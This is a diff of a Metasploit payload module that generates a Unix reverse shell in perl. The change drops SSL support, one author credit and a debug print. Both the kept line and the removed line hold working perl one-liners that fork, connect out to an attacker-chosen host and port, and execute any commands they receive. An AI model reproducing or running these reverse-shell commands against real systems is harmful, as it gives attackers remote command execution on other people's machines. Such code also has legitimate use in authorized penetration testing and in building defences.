@@ -23,8 +23,8 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'          => 'Unix Command Shell, Reverse TCP (via perl)',
 			'Version'       => '$Revision$',
-			'Description'   => 'Creates an interactive shell via perl, supports SSL',
-			'Author'        => ['cazz', 'RageLtMan']
+			'Description'   => 'Creates an interactive shell via perl',
+			'Author'        => 'cazz',
 			'License'       => BSD_LICENSE,
 			'Platform'      => 'unix',
 			'Arch'          => ARCH_CMD,
@@ -44,7 +44,6 @@ module Metasploit3
 	# Constructs the payload
 	#
 	def generate
-		vprint_good(command_string)
 		return super + command_string
 	end
 
@@ -55,12 +54,7 @@ module Metasploit3
 		lhost = datastore['LHOST']
 		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		if datastore['SSLHandler']
-			# Need a succinct way to determine when $c is closed from the framework side, this method is presently unsafe as it leaves the process hanging
-			cmd = "perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(\"#{lhost}:#{datastore['LPORT']}\");while($c){sysread($c,$i,8192);syswrite($c,`$i`);}'"
-		else
-			cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
-		end
+		cmd   = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\"#{lhost}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
 	end
 
 end
